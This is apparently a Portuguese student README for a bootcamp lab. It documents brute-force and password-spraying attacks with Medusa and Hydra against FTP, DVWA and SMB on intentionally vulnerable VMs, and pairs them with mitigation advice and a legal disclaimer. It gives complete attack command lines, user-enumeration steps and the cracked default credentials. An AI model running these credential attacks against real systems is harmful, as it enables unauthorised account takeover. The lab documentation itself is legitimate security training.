# 🔐 Projeto: Ataques de Força Bruta com Medusa e Kali Linux

> **Desafio DIO.ME** - Implementação prática de testes de segurança em ambiente controlado

[![GitHub](https://img.shields.io/badge/GitHub-Repository-blue?logo=github)](https://github.com/Hevellyntecn/medusa-brute-force-project)
[![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux)](https://www.kali.org/)
[![Security](https://img.shields.io/badge/Security-Testing-red?logo=security)](https://www.kali.org/tools/medusa/)

## 📋 Índice

- [Sobre o Projeto](#sobre-o-projeto)
- [Objetivos de Aprendizagem](#objetivos-de-aprendizagem)
- [Tecnologias Utilizadas](#tecnologias-utilizadas)
- [Configuração do Ambiente](#configuração-do-ambiente)
- [Cenários de Teste](#cenários-de-teste)
  - [1. Ataque de Força Bruta em FTP](#1-ataque-de-força-bruta-em-ftp)
  - [2. Automação de Tentativas em DVWA](#2-automação-de-tentativas-em-dvwa)
  - [3. Password Spraying em SMB](#3-password-spraying-em-smb)
- [Medidas de Mitigação](#medidas-de-mitigação)
- [Resultados e Conclusões](#resultados-e-conclusões)
- [Como Reproduzir](#como-reproduzir)
- [Recursos Úteis](#recursos-úteis)
- [Aviso Legal](#aviso-legal)

## 🎯 Sobre o Projeto

Este projeto documenta a implementação prática de testes de segurança utilizando **Kali Linux** e a ferramenta **Medusa** para simular ataques de força bruta em ambientes vulneráveis controlados (Metasploitable 2 e DVWA).

O objetivo foi compreender como funcionam os ataques de força bruta, identificar vulnerabilidades comuns e aprender a implementar medidas de prevenção eficazes.

⚠️ **IMPORTANTE**: Todos os testes foram realizados em ambiente controlado e isolado. Este projeto tem fins exclusivamente educacionais.

## 🎓 Objetivos de Aprendizagem

Ao concluir este projeto, foi possível:

- ✅ Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- ✅ Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado
- ✅ Documentar processos técnicos de forma clara e estruturada
- ✅ Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- ✅ Utilizar o GitHub como portfólio técnico

## 🛠️ Tecnologias Utilizadas

| Ferramenta | Versão | Descrição |
|------------|--------|-----------|
| **Kali Linux** | 2024.x | Sistema operacional para testes de penetração |
| **Medusa** | 2.2 | Ferramenta de força bruta paralela |
| **Metasploitable 2** | 2.0.0 | Máquina virtual intencionalmente vulnerável |
| **DVWA** | Latest | Damn Vulnerable Web Application |
| **VirtualBox** | 7.x | Virtualização do ambiente de testes |
| **Nmap** | 7.x | Enumeração de serviços e portas |

## ⚙️ Configuração do Ambiente

### Pré-requisitos

- VirtualBox instalado
- Pelo menos 4GB de RAM disponível
- 20GB de espaço em disco
- Conhecimentos básicos de Linux e redes

### Estrutura do Laboratório

```
┌─────────────────────────────────────────┐
│         Rede Interna (Host-Only)        │
│                                         │
│  ┌──────────────┐    ┌───────────────┐  │
│  │  Kali Linux  │    │ Metasploitable│  │
│  │              │───▶│      2        │  │
│  │ 192.168.56.2 │    │ 192.168.56.3  │  │
│  └──────────────┘    └───────────────┘  │
│                                         │
│  ┌──────────────────────────────────┐   │
│  │          DVWA                    │   │
│  │    (http://192.168.56.3/dvwa)    │   │
│  └──────────────────────────────────┘   │
└─────────────────────────────────────────┘
```

### Passo a Passo da Configuração

#### 1. Download das VMs

```bash
# Kali Linux
wget https://cdimage.kali.org/kali-2024.x/kali-linux-2024.x-virtualbox-amd64.7z

# Metasploitable 2
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
```

#### 2. Configuração de Rede no VirtualBox

Para cada VM:
1. Configurações → Rede → Adaptador 1
2. Habilitar Adaptador de Rede
3. Conectado a: **Rede Host-Only**
4. Nome: **VirtualBox Host-Only Ethernet Adapter**

#### 3. Configuração de IPs

**Kali Linux:**
```bash
sudo ip addr add 192.168.56.2/24 dev eth0
sudo ip link set eth0 up
```

**Metasploitable 2:**
```bash
# Login: msfadmin / msfadmin
sudo ifconfig eth0 192.168.56.3 netmask 255.255.255.0
```

#### 4. Verificar Conectividade

```bash
# Do Kali Linux
ping -c 4 192.168.56.3
nmap -sV 192.168.56.3
```

## 🔬 Cenários de Teste

### 1. Ataque de Força Bruta em FTP

#### Reconhecimento

```bash
# Descobrir serviços ativos
nmap -sV -p 21 192.168.56.3

# Resultado esperado:
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     vsftpd 2.3.4
```

#### Preparar Wordlist

Utilizamos uma wordlist personalizada com senhas comuns:

```bash
# Wordlist localizada em: wordlists/ftp-passwords.txt
cat wordlists/ftp-passwords.txt
```

#### Executar Ataque

```bash
# Ataque de força bruta usando Medusa
medusa -h 192.168.56.3 -u msfadmin -P wordlists/ftp-passwords.txt -M ftp

# Parâmetros:
# -h : Host alvo
# -u : Usuário específico
# -P : Arquivo com lista de senhas
# -M : Módulo (ftp)
```

#### Resultado

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Validação de Acesso

```bash
ftp 192.168.56.3
# Username: msfadmin
# Password: msfadmin
```

📸 *Capturas de tela em: [images/ftp-attack/](images/ftp-attack/)*

---

### 2. Automação de Tentativas em DVWA

#### Acesso ao DVWA

1. Navegador: `http://192.168.56.3/dvwa`
2. Login padrão: `admin / password`
3. Configurar Security Level: **Low**

#### Análise do Formulário de Login

```bash
# Capturar requisição POST do formulário
# Usar DevTools do navegador (F12) → Network
# Parâmetros identificados:
# - username
# - password
# - Login=Login
```

#### Executar Ataque com Medusa

```bash
# Módulo HTTP Form
medusa -h 192.168.56.3 -u admin -P wordlists/web-passwords.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Login failed"

# Parâmetros:
# -M web-form : Módulo para formulários web
# -m FORM : URL do formulário
# -m FORM-DATA : Dados do POST
# -m DENY-SIGNAL : Mensagem de erro para identificar falha
```

#### Alternativamente: Hydra

```bash
hydra -l admin -P wordlists/web-passwords.txt \
  192.168.56.3 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

#### Resultado

```
ACCOUNT FOUND: [web-form] Host: 192.168.56.3 User: admin Password: password [SUCCESS]
```

📸 *Capturas de tela em: [images/dvwa-attack/](images/dvwa-attack/)*

---

### 3. Password Spraying em SMB

#### Enumeração de Usuários

```bash
# Enumerar usuários do sistema
enum4linux -U 192.168.56.3

# Ou usar Nmap
nmap --script smb-enum-users.nse -p445 192.168.56.3

# Usuários encontrados:
# - root
# - msfadmin
# - user
# - service
```

#### Criar Lista de Usuários

```bash
# Arquivo: wordlists/smb-users.txt
cat > wordlists/smb-users.txt << EOF
root
msfadmin
user
service
postgres
EOF
```

#### Password Spraying (mesma senha para múltiplos usuários)

```bash
# Testar senha comum em múltiplos usuários
medusa -H wordlists/smb-users.txt -p msfadmin -M smbnt -h 192.168.56.3

# Parâmetros:
# -H : Arquivo com lista de usuários
# -p : Senha única (spraying)
# -M : Módulo SMB
```

#### Ataque de Força Bruta Tradicional

```bash
# Combinar usuários e senhas
medusa -H wordlists/smb-users.txt -P wordlists/smb-passwords.txt \
  -M smbnt -h 192.168.56.3 -t 4

# -t 4 : Limita a 4 threads paralelas
```

#### Resultado

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Validação de Acesso

```bash
# Conectar via SMB
smbclient //192.168.56.3/tmp -U msfadmin
# Password: msfadmin

# Listar compartilhamentos
smbclient -L //192.168.56.3 -U msfadmin
```

📸 *Capturas de tela em: [images/smb-attack/](images/smb-attack/)*

---

## 🛡️ Medidas de Mitigação

### Defesas Contra Força Bruta

#### 1. Políticas de Senha Fortes

```bash
# Exemplo de política de senha forte:
- Mínimo de 12 caracteres
- Combinação de maiúsculas, minúsculas, números e símbolos
- Não usar palavras do dicionário
- Não reutilizar senhas
```

#### 2. Limitação de Tentativas (Rate Limiting)

**Para SSH/FTP (fail2ban):**
```bash
sudo apt install fail2ban
sudo systemctl enable fail2ban

# Configuração em /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600
```

#### 3. Autenticação Multifator (MFA)

- Implementar 2FA em todos os serviços web
- Usar chaves SSH ao invés de senhas
- Tokens de autenticação com tempo limitado

#### 4. Monitoramento e Alertas

```bash
# Monitorar logs de autenticação
tail -f /var/log/auth.log | grep "Failed password"

# Alertas automáticos com SIEM
- Splunk
- ELK Stack
- OSSEC
```

#### 5. Configurações Específicas por Serviço

**FTP:**
```bash
# vsftpd.conf
max_login_fails=3
delay_failed_login=5
delay_successful_login=1
```

**Apache (DVWA):**
```apache
# .htaccess
<Limit GET POST>
  order deny,allow
  deny from all
  allow from 192.168.1.0/24
</Limit>
```

**SMB:**
```bash
# smb.conf
[global]
  account lockout threshold = 5
  account lockout duration = 30
  reset account lockout counter = 30
```

📄 *Documentação completa em: [docs/MITIGACAO.md](docs/MITIGACAO.md)*

---

## 📊 Resultados e Conclusões

### Métricas dos Testes

| Serviço | Tentativas | Tempo | Taxa de Sucesso | Observações |
|---------|-----------|-------|-----------------|-------------|
| FTP | 50 senhas | ~30s | 100% (senha fraca) | Sem limitação de tentativas |
| DVWA | 100 senhas | ~2min | 100% (senha comum) | Sem CAPTCHA ou rate limiting |
| SMB | 200 combos | ~5min | 50% (múltiplos usuários) | Enumeração de usuários exposta |

### Principais Aprendizados

1. **Vulnerabilidade de Credenciais Padrão**: Todos os sistemas testados utilizavam credenciais padrão ou muito fracas
2. **Ausência de Rate Limiting**: Nenhum serviço implementava limitação de tentativas
3. **Enumeração Facilitada**: Possível enumerar usuários sem autenticação
4. **Importância do Monitoramento**: Ataques deixam rastros claros nos logs

### Recomendações Gerais

- ✅ **Nunca** usar credenciais padrão em produção
- ✅ Implementar políticas de senha fortes
- ✅ Utilizar autenticação multifator sempre que possível
- ✅ Monitorar logs de autenticação continuamente
- ✅ Aplicar rate limiting em todos os serviços
- ✅ Manter sistemas atualizados
- ✅ Realizar testes de penetração regularmente

---

## 🚀 Como Reproduzir

### Requisitos

```bash
# No Kali Linux, instalar ferramentas
sudo apt update
sudo apt install -y medusa hydra nmap enum4linux smbclient

# Verificar instalação
medusa -d
```

### Clone do Repositório

```bash
git clone https://github.com/seu-usuario/medusa-brute-force-project.git
cd medusa-brute-force-project
```

### Estrutura de Arquivos

```
medusa-brute-force-project/
├── README.md                    # Este arquivo
├── docs/
│   ├── MITIGACAO.md            # Guia de mitigação detalhado
│   ├── CONFIGURACAO.md         # Passo a passo da configuração
│   └── COMANDOS.md             # Referência rápida de comandos
├── wordlists/
│   ├── ftp-passwords.txt       # Wordlist para FTP
│   ├── web-passwords.txt       # Wordlist para DVWA
│   ├── smb-passwords.txt       # Wordlist para SMB
│   └── smb-users.txt           # Lista de usuários SMB
├── scripts/
│   ├── setup-environment.sh    # Script de configuração automática
│   ├── test-ftp.sh            # Script de teste FTP
│   ├── test-dvwa.sh           # Script de teste DVWA
│   └── test-smb.sh            # Script de teste SMB
└── images/
    ├── ftp-attack/            # Capturas de tela FTP
    ├── dvwa-attack/           # Capturas de tela DVWA
    └── smb-attack/            # Capturas de tela SMB
```

### Executar Testes

```bash
# 1. Configurar ambiente
chmod +x scripts/*.sh
./scripts/setup-environment.sh

# 2. Executar testes individuais
./scripts/test-ftp.sh 192.168.56.3
./scripts/test-dvwa.sh 192.168.56.3
./scripts/test-smb.sh 192.168.56.3
```

---

## 📚 Recursos Úteis

### Documentações Oficiais

- [Kali Linux - Site Oficial](https://www.kali.org/)
- [Medusa - Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)
- [DVWA - Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Metasploitable 2 - Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [Nmap - Manual Oficial](https://nmap.org/book/man.html)

### Tutoriais e Guias

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Medusa Cheat Sheet](https://www.kitploit.com/2017/01/medusa-speedy-massively-parallel.html)
- [Fail2Ban Configuration](https://www.fail2ban.org/wiki/index.php/Main_Page)

### Wordlists Conhecidas

- [SecLists - Daniel Miessler](https://github.com/danielmiessler/SecLists)
- [RockYou Wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

---

## ⚖️ Aviso Legal

**⚠️ DISCLAIMER - LEIA COM ATENÇÃO**

Este projeto foi desenvolvido **exclusivamente para fins educacionais** como parte do desafio da plataforma DIO.ME.

### Responsabilidade de Uso

- ✅ **PERMITIDO**: Usar em ambientes controlados e isolados de sua propriedade
- ✅ **PERMITIDO**: Estudar e aprender sobre segurança da informação
- ✅ **PERMITIDO**: Testar em laboratórios virtuais pessoais

- ❌ **PROIBIDO**: Realizar testes em sistemas sem autorização explícita por escrito
- ❌ **PROIBIDO**: Utilizar para atividades maliciosas ou ilegais
- ❌ **PROIBIDO**: Atacar infraestruturas de terceiros

### Legislação Brasileira

O uso indevido destas técnicas pode violar:
- **Lei 12.737/2012** (Lei Carolina Dieckmann) - Invasão de dispositivo informático
- **Lei 14.155/2021** - Crimes cibernéticos e fraudes eletrônicas
- **Código Penal Brasileiro** - Arts. 154-A e 154-B

### Ética em Segurança

Como profissional de segurança, você deve:
- 🤝 Sempre obter autorização por escrito antes de realizar testes
- 📋 Documentar todas as atividades e descobertas
- 🔒 Manter sigilo sobre vulnerabilidades descobertas
- 👥 Reportar vulnerabilidades de forma responsável
- 📚 Usar conhecimento para proteger, não para atacar

**O autor deste projeto não se responsabiliza pelo uso inadequado das técnicas e ferramentas aqui documentadas.**

---

## 👨‍💻 Autor

**Hevellyn**
- GitHub: [@Hevellyntecn](https://github.com/Hevellyntecn)
- DIO.ME: Bootcamp Santander 2025

---

## 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.

---

## 🙏 Agradecimentos

- [DIO.ME](https://dio.me) - Pela oportunidade de aprendizado
- [Offensive Security](https://www.offensive-security.com/) - Criadores do Kali Linux
- [Rapid7](https://www.rapid7.com/) - Metasploitable 2
- Comunidade de Segurança da Informação

---

<div align="center">

**⭐ Se este projeto foi útil para você, considere dar uma estrela!**

[![GitHub stars](https://img.shields.io/github/stars/Hevellyntecn/medusa-brute-force-project?style=social)](https://github.com/Hevellyntecn/medusa-brute-force-project/stargazers)

**Projeto desenvolvido para o Bootcamp Santander 2025 - DIO**

</div>
